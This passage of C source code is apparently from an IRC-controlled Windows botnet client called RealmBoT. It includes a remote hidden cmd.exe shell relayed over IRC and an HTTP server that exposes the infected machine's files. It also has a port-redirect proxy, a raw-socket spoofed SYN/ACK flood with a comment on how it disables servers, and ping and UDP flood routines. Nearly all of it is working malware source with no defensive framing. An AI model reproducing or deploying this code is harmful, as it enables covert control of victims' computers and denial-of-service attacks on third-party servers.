		GetFiles(tFile,httpd.sock,NULL,nFile);

	fclosesocket(httpd.sock);
	clearthread(httpd.threadnum);

	ExitThread(0);
}

int Check_Requested_File(SOCKET sock, char *dir ,char *rFile, BOOL dirinfo, int threadnum)
{
	char buffer[IRCLINE], file[MAX_PATH], nFile[MAX_PATH], tFile[MAX_PATH];

	DWORD c,d, id;
	BOOL directory = FALSE;

	memset(nFile,0,sizeof(nFile));
	if (rFile[0] != 47)
		sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c=0,d=0; c<strlen(file); c++,d++) {
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		} else
			nFile[d] = ((file[c] == 47)?(92):(file[c]));
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");

	switch(GetFileAttributes(tFile)) {
	case FILE_ATTRIBUTE_DIRECTORY:
		directory = TRUE;
		break;
	case 0xFFFFFFFF:
		fclosesocket(sock);
		return 0;
	}

	if (nFile[d-1] == 92)
		directory = TRUE;

	HTTPD httpd;
	httpd.sock = sock;
	httpd.info = FALSE;

	if (directory) {
		if (dirinfo) {
			strcat(tFile,"*");
			sprintf(httpd.file,tFile);

			File_To_HTML(nFile);
			sprintf(httpd.path,nFile);

			httpd.type = TRUE;
			httpd.length = -1;
		} else {
			fclosesocket(sock);

			return 0;
		}
	} else {
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      	if (testfile != INVALID_HANDLE_VALUE) {
			sprintf(httpd.file,tFile);

			httpd.type = FALSE;
			httpd.length = GetFileSize(testfile,NULL);

			CloseHandle(testfile);
		}
	}

	sprintf(buffer,"RealmBoT (httpd.p.l.g) .»».  Worker thread of server thread: %d.", threadnum);
	httpd.threadnum = addthread(buffer,HTTP_THREAD,NULL);
	threads[httpd.threadnum].parent = threadnum;
	if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Header, (LPVOID)&httpd, 0, &id)) {
		while (httpd.info == FALSE)
			Sleep(5);
	} else {
		fclosesocket(sock);
		sprintf(buffer,"RealmBoT (httpd.p.l.g) .»».  Failed to start worker thread, error: <%d>.", GetLastError());
		addlog(buffer);
	}

	return 0;
}

int GetFiles(char *current, SOCKET sock, char *chan, char *URL)
{
	FILETIME ftBuf;
	SYSTEMTIME stBuf;
	WIN32_FIND_DATA WFD;

	char sendbuf[IRCLINE],parent[MAX_PATH],tmpDate[40],tmpDir[MAX_PATH+2];
	int count=0, count2=0;
	unsigned int COL1=230, COL2=150, COL3=60, FILESIZE=30;

	memset(parent,0,sizeof(parent));
	strtok(current,"\n");
	if (chan)
		_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :Searching for: %s\r\n",chan,current);
	else
		if (URL) {
			current[(strlen(current)-1)]=0;

			_snprintf(sendbuf,sizeof(sendbuf),"<HTML>\r\n<HEAD>\r\n<TITLE>Index of %s</TITLE>\r\n</HEAD>\r\n<BODY>\r\n",
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<H1>Index of %s</H1>\r\n<TABLE BORDER=\"0\">\r\n",
				current);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			current[(strlen(current))]='*';

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD WIDTH=\"%d\"><CODE>Name</CODE></TD>\r\n<TD WIDTH=\"%d\"><CODE>Last Modified</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>Size</CODE></TD>\r\n</TR>\r\n",
				COL1, COL2, COL3);
			fsend(sock,sendbuf,strlen(sendbuf),0);

			_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n");
		} else
			_snprintf(sendbuf,sizeof(sendbuf),"Searching for: %s\r\n",current);

	fsend(sock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		unsigned int c;

		for (c=strlen(URL)-3; c!=0; c--)
			if (URL[c] == 47)
				break;
		strncpy(parent,URL,c+1);

		_snprintf(sendbuf,sizeof(sendbuf),"<TR>\r\n<TD COLSPAN=\"3\"><A HREF=\"%s\"><CODE>Parent Directory</CODE></A></TD>\r\n</TR>\r\n",parent);
		fsend(sock,sendbuf,strlen(sendbuf),0);
	}

	HANDLE Hnd = FindFirstFile(current, &WFD);
	while (FindNextFile(Hnd, &WFD)) {
		if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, "."))) {
			FileTimeToLocalFileTime(&WFD.ftLastWriteTime, &ftBuf);
			FileTimeToSystemTime(&ftBuf, &stBuf);
			sprintf(tmpDate, "%2.2d/%2.2d/%4d  %2.2d:%2.2d %s",
				stBuf.wMonth, stBuf.wDay, stBuf.wYear, HOUR(stBuf.wHour), stBuf.wMinute, AMPM(stBuf.wHour));

			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) {
					_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s\n",chan,tmpDir, tmpDate);
				} else
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s/",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>FILESIZE)
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.29s&gt;/</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s/</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>-</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3);
					} else {
						_snprintf(tmpDir,sizeof(tmpDir),"<%s>",WFD.cFileName);
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s\r\n",tmpDir,tmpDate);
					}
			} else {
				count++;
				if (chan)
					_snprintf(sendbuf,sizeof(sendbuf),"PRIVMSG %s :%-31s  %-21s (%s bytes)\n",chan,WFD.cFileName,tmpDate,commaI64(WFD.nFileSizeLow));
				else
					if (URL) {
						_snprintf(sendbuf,(sizeof(sendbuf)-1),"<TR>\r\n<TD WIDTH=\"%d\"><A HREF=\"",COL1);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"%s%s",URL,WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						if(strlen(WFD.cFileName)>(FILESIZE+1))
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%.30s&gt;</CODE></A>",WFD.cFileName);
						else
							_snprintf(sendbuf,(sizeof(sendbuf)-1),"\"><CODE>%s</CODE></A>",WFD.cFileName);
	 					fsend(sock,sendbuf,strlen(sendbuf),0);

						_snprintf(sendbuf,(sizeof(sendbuf)-1),"</TD>\r\n<TD WIDTH=\"%d\"><CODE>%s</CODE></TD>\r\n<TD WIDTH=\"%d\" ALIGN=\"right\"><CODE>%dk</CODE></TD>\r\n</TR>\r\n",
							COL2,tmpDate,COL3,(WFD.nFileSizeLow/1024));
					} else
						_snprintf(sendbuf,sizeof(sendbuf),"%-31s  %-21s (%i bytes)\r\n",WFD.cFileName,tmpDate,WFD.nFileSizeLow);
			}
			fsend(sock,sendbuf,strlen(sendbuf),0);

			if (chan)
				Sleep(FLOOD_DELAY);
		}

	}
	FindClose(Hnd);

	if (chan)
		sprintf(sendbuf,"PRIVMSG %s :Found %s Files and %s Directories\n",chan,commaI64(count),commaI64(count2));
	else if (URL)
		sprintf(sendbuf,"<TR>\r\n<TD COLSPAN=\"3\"><HR></TD>\r\n</TR>\r\n</TABLE>\r\n</BODY>\r\n</HTML>\r\n");
	else
		sprintf(sendbuf,"Found: %i Files and %i Directories\r\n",count,count2);
	fsend(sock,sendbuf,strlen(sendbuf),0);

	return 0;
}

void HTTP_Send_File(SOCKET sock, char *file)
{
	char buffer[1024];

	unsigned int Fsize,Fsend=1024,move;
	DWORD mode=0;

	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE)
		return;

	Fsize = GetFileSize(testfile,NULL);

	while (Fsize) {
		memset(buffer,0,sizeof(buffer));

		if (Fsend>Fsize)
			Fsend=Fsize;
		move=0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);

		int bytes_sent=fsend(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK)
				break;
			else
				bytes_sent = 0;
		}
		Fsize=Fsize-bytes_sent;
	}

	if (testfile != INVALID_HANDLE_VALUE)
		CloseHandle(testfile);

	return;
}

char *File_To_HTML(char *file)
{
	for (unsigned int c=0; c<strlen(file); c++)
		if (file[c] == 92)
			file[c] = 47;

	return file;
}

void HTTP_Connect(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *host, int port, char *method, char *url, char *referer)
{
	char sendbuf[IRCLINE], buffer[256];

	WSADATA wsaData;
	fWSAStartup(MAKEWORD(1,1), &wsaData);

	SOCKET hsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);
	ssin.sin_addr.s_addr = ResolveAddress(host);

	if (fconnect(hsock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
		_snprintf(buffer,sizeof(buffer),"%s %s HTTP/1.1\nReferer: %s\nHost: %s\nConnection: close\n\n",method,url,((referer)?(referer):("")),host);

		fsend(hsock, buffer, strlen(buffer), 0);
		memcpy(buffer,0,sizeof(buffer));
		frecv(hsock, buffer, sizeof(buffer), 0);
	}

	fclosesocket(hsock);
	fWSACleanup();

	sprintf(sendbuf, buffer);
	if (!silent) irc_privmsg(sock, chan, sendbuf, notice);

	return;
}
#endif
#ifndef NO_REDIRECT

// port redirect function
DWORD WINAPI RedirectThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	DWORD id;

	SOCKADDR_IN rsin, csin;
	memset(&rsin, 0, sizeof(rsin));
	rsin.sin_family = AF_INET;
	rsin.sin_port = fhtons((unsigned short)redirect.lport);
	rsin.sin_addr.s_addr = INADDR_ANY;

	int csin_len = sizeof(csin);

	SOCKET rsock, csock;
	if ((rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		threads[redirect.threadnum].sock = rsock;

		fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
		if (fbind(rsock, (LPSOCKADDR)&rsin, sizeof(rsin)) == 0) {
			if (flisten(rsock, 10) == 0) {
				while(1) {
					if ((csock = faccept(rsock, (LPSOCKADDR)&csin, &csin_len)) != INVALID_SOCKET) {
						redirect.csock = csock;

						redirect.gotinfo = FALSE;
						sprintf(sendbuf,"RealmBoT (redirect.p.l.g) .»».   Client connection from IP: %s:%d, Server thread: %d.", finet_ntoa(csin.sin_addr), csin.sin_port, redirect.threadnum);
						redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,csock);
						threads[redirect.cthreadnum].parent = redirect.threadnum;
						if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoopThread,(LPVOID)&redirect,0,&id)) {
							while (redirect.gotinfo == FALSE)
								Sleep(50);
						} else {
							addlogv("RealmBoT (redirect.p.l.g) .»».   Failed to start client thread, error: <%d>.", GetLastError());
							break;
						}
					}
				}
			}
		}
	}

	fclosesocket(csock);
	fclosesocket(rsock);
	clearthread(redirect.threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI RedirectLoopThread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->gotinfo = TRUE;

	int threadnum=redirect.cthreadnum;

	char sendbuf[IRCLINE], buff[4096];
	int err;
	DWORD id;

	SOCKET ssock;
	do {
		if ((ssock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) break;

		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned short)redirect.port);

		IN_ADDR iaddr;
		iaddr.s_addr = finet_addr(redirect.dest);
		LPHOSTENT hostent;
		if (iaddr.s_addr == INADDR_NONE)
			hostent = fgethostbyname(redirect.dest);
		else
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(iaddr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		if ((err = fconnect(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) break;

		redirect.cgotinfo = FALSE;
		sprintf(sendbuf,"RealmBoT (redirect.p.l.g) .»».   Client connection to IP: %s:%d, Server thread: %d.", finet_ntoa(ssin.sin_addr), ssin.sin_port, redirect.threadnum);
		redirect.cthreadnum = addthread(sendbuf,REDIRECT_THREAD,ssock);
		threads[redirect.cthreadnum].parent = redirect.threadnum;
		threads[redirect.cthreadnum].csock = threads[threadnum].sock;
		if (threads[redirect.cthreadnum].tHandle = CreateThread(NULL,0,&RedirectLoop2Thread,(LPVOID)&redirect,0,&id)) {
			while (redirect.cgotinfo == FALSE)
				Sleep(50);
		} else {
			addlogv("RealmBoT (redirect.p.l.g) .»».   Failed to start connection thread, error: <%d>.", GetLastError());
			break;
		}

		while (1) {
			memset(buff, 0, sizeof(buff));
			if ((err = frecv(threads[threadnum].sock, buff, sizeof(buff), 0)) <= 0) break;
			if ((err = fsend(ssock, buff, err, 0)) == SOCKET_ERROR) break;
		}
		break;
	} while (1);

	fclosesocket(threads[threadnum].sock);
	fclosesocket(ssock);

	clearthread(threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI RedirectLoop2Thread(LPVOID param)
{
	REDIRECT redirect = *((REDIRECT *)param);
	REDIRECT *redirectp = (REDIRECT *)param;
	redirectp->cgotinfo = TRUE;

	int threadnum=redirect.cthreadnum, err;

	char buff[4096];

	while (1) {
		memset(buff, 0, sizeof(buff));
		if ((err = frecv(threads[threadnum].csock, buff, sizeof(buff), 0)) <= 0) break;
		if ((err = fsend(threads[threadnum].sock, buff, err, 0)) == SOCKET_ERROR) break;
	}
	fclosesocket(threads[threadnum].csock);

	clearthread(threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_REMOTECMD

HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50];

void Close_Handles(void)
{
	if (pipe_read != INVALID_HANDLE_VALUE)
		CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE)
		CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE)
		CloseHandle(pipe_Hproc);

	return;
}

BOOL send_commands(char *commands)
{
	DWORD cmdlen = strlen(commands);
	if (!WriteFile(hChildInWrDupe,commands,cmdlen,&cmdlen,NULL)) {
		Close_Handles();
		return FALSE;
	}

	return TRUE;
}

int pipe_send(SOCKET sock,char *chan,char *buf)
{
	char sendbuf[IRCLINE];

	if (strcmp(chan, "") != 0) {
		Sleep(FLOOD_DELAY);
		sprintf(sendbuf,"PRIVMSG %s :%s\r",chan,buf);
	} else
		sprintf(sendbuf,"%s",buf);

	if (fsend(sock,sendbuf,strlen(sendbuf),0) <= 0)
		Close_Handles();

	return 0;
}

DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[IRCLINE];

	int threadnum = (int)param;

	while (1) {
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,IRCLINE,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"RealmBoT (cmd.p.l.g) .»».  Could not read data from proccess\r\n");
			clearthread(threadnum);

			ExitThread(1);
		}

		if (br == 0) { //nothing to read
			if (GetExitCodeProcess(pipe_Hproc,&State)) {
				if (State != STILL_ACTIVE) {
					Close_Handles();
					pipe_send(pipesock,pipe_chan,"RealmBoT (cmd.p.l.g) .»».  Proccess has terminated.\r\n");
					clearthread(threadnum);

					ExitThread (0);
				}
			}
			Sleep(10); //process pause and retry
			continue;
		}

		DWORD cbyte;
		for (cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n') {
				eol = TRUE;
				break;
			}
		}
		if (eol)
			br = cbyte + 1;
		else
			br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL))
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"RealmBoT (cmd.p.l.g) .»».  Could not read data from proccess.\r\n");
	clearthread(threadnum);

	ExitThread (0);
}

int open_cmd(SOCKET sock,char * chan)
{
	char buffer[IRCLINE], cmddir[MAX_PATH];
	int threadnum;

	SECURITY_ATTRIBUTES secAttr;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;

	Close_Handles();

	if(fSearchPath(NULL,"cmd.exe",NULL,sizeof(cmddir),cmddir,NULL) == 0)
		return -1;

    secAttr.nLength = sizeof(secAttr);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0))
		return -1;
    if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0))
		return -1;
    if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE))
		return -1;

  	PROCESS_INFORMATION pinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	STARTUPINFO sinfo;
   	memset(&sinfo, 0, sizeof(sinfo));
   	sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = hChildInRd;
    sinfo.hStdOutput = hChildOutWr;
	sinfo.hStdError = hChildOutWr;
   	if (!CreateProcess(cmddir,"", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo))
		return -1;
   	CloseHandle(hChildInRd);

	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = pinfo.hProcess;
   	CloseHandle(pinfo.hThread);
	pipesock = sock;

	if (chan)
		sprintf(pipe_chan,chan);
	else
		sprintf(pipe_chan,"");

	threadnum = addthread("RealmBoT (cmd.p.l.g) .»».  Remote Command Prompt",RCMD_THREAD,NULL);
	threads[threadnum].pid = pinfo.dwProcessId;
	if ((threads[threadnum].tHandle = CreateThread(NULL, 0, &PipeReadThread, (LPVOID)threadnum, 0, &id)) == NULL) {
		sprintf(buffer,"RealmBoT (cmd.p.l.g) .»».  Failed to start IO thread, error: <%d>.", GetLastError());
		addlog(buffer);
	}

	return 0;
}
#endif


#ifndef NO_DDOS

DWORD WINAPI DDOSThread(LPVOID param)
{
	char sendbuf[IRCLINE];

	DDOS ddos = *((DDOS *)param);
	DDOS *ddoss = (DDOS *)param;
	ddoss->gotinfo = TRUE;

	srand(GetTickCount());

	sprintf(sendbuf, "RealmBoT (ddos.p.l.g) .»».  Done with flood (%iKB/sec).", DDOSAttack(ddos.ip, ddos.port, ddos.type, ddos.length));
	if (!ddos.silent) irc_privmsg(ddos.sock, ddos.chan, sendbuf, ddos.notice);
	addlog(sendbuf);

	clearthread(ddos.threadnum);

	ExitThread(0);
}

long SendDDOS(unsigned long TargetIP, unsigned int SpoofingIP, char *Type, unsigned short TargetPort, int len)
{
	WSADATA WSAData;
	SOCKET sock;
	SOCKADDR_IN addr_in;
	IPHEADER ipHeader;
	TCPHEADER tcpHeader;
	PSDHEADER psdHeader;

	LARGE_INTEGER freq, halt_time, cur;
	char szSendBuf[60]={0},buf[64];
	int rect;

	if (fWSAStartup(MAKEWORD(2,2), &WSAData)!=0)
		return FALSE;

	if ((sock = fWSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED )) == INVALID_SOCKET) {
		fWSACleanup();
		return FALSE;
	}

	BOOL flag=TRUE;
	if (fsetsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag)) == SOCKET_ERROR) {
		fclosesocket(sock);
		fWSACleanup();
		return FALSE;
	}

	addr_in.sin_family=AF_INET;
	addr_in.sin_port=fhtons((unsigned short)TargetPort);
	addr_in.sin_addr.s_addr=TargetIP;

	ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
	ipHeader.total_len=fhtons(sizeof(ipHeader)+sizeof(tcpHeader));
	ipHeader.ident=1;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_TCP;
	ipHeader.checksum=0;
	ipHeader.destIP=TargetIP;

	tcpHeader.dport=fhtons((unsigned short)TargetPort);
	tcpHeader.sport=fhtons((unsigned short)rand()%1025);
	tcpHeader.seq=fhtonl(0x12345678);

	/* A SYN attack simply smash its target up with TCP SYN packets.
	Each SYN packet needs a SYN-ACK response and forces the server to wait for
	the good ACK in reply. Of course, we just never gives the ACK, since we use a
	bad IP address (spoof) there's no chance of an ACK returning.
	This quickly kills a server as it tries to send out SYN-ACKs while waiting for ACKs.
	When the SYN-ACK queues fill up, the server can no longer take any incoming SYNs,
	and that's the end of that server until the attack is cleared up.*/

	if (strcmp(Type,"ddos.syn") == 0) {
		tcpHeader.ack_seq=0;
		tcpHeader.flags=SYN;
	} else if (strcmp(Type,"ddos.ack") == 0) {
		tcpHeader.ack_seq=0;
		tcpHeader.flags=ACK;
	} else if (strcmp(Type,"ddos.random") == 0) {
		tcpHeader.ack_seq=rand()%3;
		if (rand()%2 == 0)
			tcpHeader.flags=SYN;
		else
			tcpHeader.flags=ACK;
	}

	tcpHeader.lenres=(sizeof(tcpHeader)/4<<4|0);
	tcpHeader.window=fhtons(16384);
	tcpHeader.urg_ptr=0;

	long total = 0;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&cur);
	halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;

	while (1) {
		tcpHeader.checksum=0;
		tcpHeader.sport=fhtons((unsigned short)((rand() % 1001) + 1000));
		tcpHeader.seq=fhtons((unsigned short)((rand() << 16) | rand()));

		ipHeader.sourceIP=fhtonl(SpoofingIP++);

		psdHeader.daddr=ipHeader.destIP;
		psdHeader.zero=0;
		psdHeader.proto=IPPROTO_TCP;
		psdHeader.length=fhtons(sizeof(tcpHeader));
		psdHeader.saddr=ipHeader.sourceIP;
		memcpy(szSendBuf, &psdHeader, sizeof(psdHeader));
		memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader));

		tcpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader));

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4);
		ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader));

		memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
		rect=fsendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(LPSOCKADDR)&addr_in, sizeof(addr_in));
		if (rect==SOCKET_ERROR) {
			sprintf(buf, "RealmBoT (ddos.p.l.g) .»».  Send error: <%d>.",fWSAGetLastError());
			addlog(buf);

			fclosesocket(sock);
			fWSACleanup();
			return 0;
		}

		total += rect;
		QueryPerformanceCounter(&cur);
		if (cur.QuadPart >= halt_time.QuadPart)
			break;
	}

	fclosesocket(sock);
	fWSACleanup();

	return (total);
}

long DDOSAttack(char *target, char *port, char *type, char *len)
{
	unsigned long TargetIP = ResolveAddress(target);
	unsigned short p = atoi(port);
	int t = atoi(len);
	unsigned int SpoofIP = TargetIP + ((rand()%512)+256);

	long num = SendDDOS(TargetIP, SpoofIP, type, p, t);

	if (num == 0)
		num = 1;
	num = num / 1000 / t;

	return num;
}
#endif

#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	VISIT visit = *((VISIT *)param);
	VISIT *visits = (VISIT *)param;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			sprintf(sendbuf,"[REALMBOT] << Invalid URL >>");
			break;
		}

		// copy url parts into variables
		if (url.dwHostNameLength > 0)
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		int vport = url.nPort;
		if (url.dwUserNameLength > 0)
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0)
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0)
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = fInternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"[REALMBOT] << Could not open a connection >>");
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"[REALMBOT] << Failed to connect to HTTP server >>");
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"[REALMBOT] << URL visited >>");
		else
			sprintf(sendbuf,"[REALMBOT] << Failed to get requested URL from HTTP server >>");
	} while(0);

	if (!visit.silent) irc_privmsg(visit.sock, visit.chan, sendbuf, visit.notice);
	addlog(sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);
}
#endif
			

#ifndef NO_PING
//  function for sending pings
DWORD WINAPI ping(LPVOID param)
{
	char sendbuf[IRCLINE], pbuff[MAXPINGSIZE];

	unsigned long ip;

	PINGFLOOD ping = *((PINGFLOOD *)param);
	PINGFLOOD *pings = (PINGFLOOD *)param;
	pings->gotinfo = TRUE;

	HANDLE icmp = (HANDLE)fIcmpCreateFile();

	IN_ADDR iaddr;
	iaddr.s_addr = finet_addr(ping.host);
	LPHOSTENT hostent = NULL;
	if (iaddr.s_addr == INADDR_NONE)
		hostent = fgethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		sprintf(sendbuf,"RealmBoT (ping.p.l.g) .»».  Error sending pings to %s.", ping.host);
		if (!ping.silent) irc_privmsg(ping.sock, ping.chan, sendbuf, ping.notice);
		addlog(sendbuf);

		clearthread(ping.threadnum);

		ExitThread(1);
	}

	if (hostent != NULL)
		ip = *(DWORD*)*hostent->h_addr_list;
	else
		ip = iaddr.s_addr;

	ICMP_ECHO_REPLY reply;
	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > MAXPINGSIZE)
		ping.size = MAXPINGSIZE;
	if (ping.delay < 1)
		ping.delay = 1;
	for (int i = 0; i < ping.num; i++)
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	fIcmpCloseHandle(icmp);

	sprintf(sendbuf,"RealmBoT (ping.p.l.g) .»».  Finished sending pings to %s.", ping.host);
	if (!ping.silent) irc_privmsg(ping.sock, ping.chan, sendbuf, ping.notice);
	addlog(sendbuf);

	clearthread(ping.threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_UDP
#define MAXUDPPORT 65535

// function for sending udp packets
DWORD WINAPI udp(LPVOID param)
{
	PINGFLOOD udp = *((PINGFLOOD *)param);
	PINGFLOOD *udps = (PINGFLOOD *)param;
	udps->gotinfo = TRUE;

	char sendbuf[IRCLINE], pbuff[MAXPINGSIZE];
